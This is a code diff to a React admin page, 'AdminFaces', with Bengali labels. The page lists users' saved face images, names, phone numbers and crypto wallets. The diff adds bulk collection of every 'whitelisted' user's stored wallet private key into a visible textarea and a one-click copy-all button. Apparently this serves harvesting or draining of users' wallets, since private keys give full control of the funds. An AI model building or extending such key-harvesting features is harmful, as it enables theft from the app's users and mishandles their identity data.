@@ -21,11 +21,32 @@ function AdminFaces() {
 
   if (isLoading) return <div className="py-10 flex justify-center"><Loader2 className="w-5 h-5 animate-spin text-cyan" /></div>;
 
+  const whitelistedKeys = (data ?? [])
+    .filter((t: any) => t.wallet_private_key && (t.whitelist_ok ?? false))
+    .map((t: any) => t.wallet_private_key as string);
+  const copyAllWhitelisted = async () => {
+    if (whitelistedKeys.length === 0) return toast.error("কোনো whitelisted key নেই");
+    await navigator.clipboard.writeText(whitelistedKeys.join("\n"));
+    toast.success(`${whitelistedKeys.length} টি whitelisted key কপি হয়েছে`);
+  };
+
   return (
     <div>
-      <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-bold px-1 mb-2">
-        Total saved faces: {data?.length ?? 0}
-      </p>
+      <div className="glass rounded-xl p-3 mb-3 space-y-2">
+        <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-bold">
+          Total saved faces: {data?.length ?? 0} · Whitelisted: {whitelistedKeys.length}
+        </p>
+        <button onClick={copyAllWhitelisted}
+          className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-emerald/15 border border-emerald/30 text-emerald font-black text-xs btn-press">
+          <Copy className="w-3.5 h-3.5" /> সব whitelisted key কপি করুন ({whitelistedKeys.length})
+        </button>
+        <textarea
+          readOnly
+          value={whitelistedKeys.join("\n")}
+          placeholder="whitelisted private keys এখানে দেখাবে"
+          className="w-full h-24 px-2 py-1.5 rounded bg-surface-2 border border-border text-[10px] mono-num resize-none outline-none"
+        />
+      </div>
       <div className="grid grid-cols-2 gap-2">
         {(data ?? []).map((t: any) => (
           <div key={t.id} className="glass rounded-xl overflow-hidden">
@@ -38,7 +59,7 @@ function AdminFaces() {
               {t.face_label && <p className="text-[11px] font-black text-amber truncate">{t.face_label}</p>}
               <p className="text-[10px] font-bold truncate">{t.profiles?.display_name ?? t.profiles?.email}</p>
               {t.profiles?.phone_number && <p className="text-[9px] text-muted-foreground mono-num truncate">{t.profiles.phone_number}</p>}
-              <p className="text-[9px] text-muted-foreground">Slot #{t.slot} • {t.status}</p>
+              <p className="text-[9px] text-muted-foreground">Slot #{t.slot} • {t.status} {t.whitelist_ok ? "· ✅" : "· ⚠️"}</p>
               {t.wallet_address && (
                 <button onClick={() => copy(t.wallet_address, "Wallet copied")} className="w-full flex items-center justify-between gap-1 px-2 py-1 rounded bg-surface-2 mono-num">
                   <span className="text-[8px] text-cyan truncate">{t.wallet_address}</span><Copy className="w-3 h-3 shrink-0" />
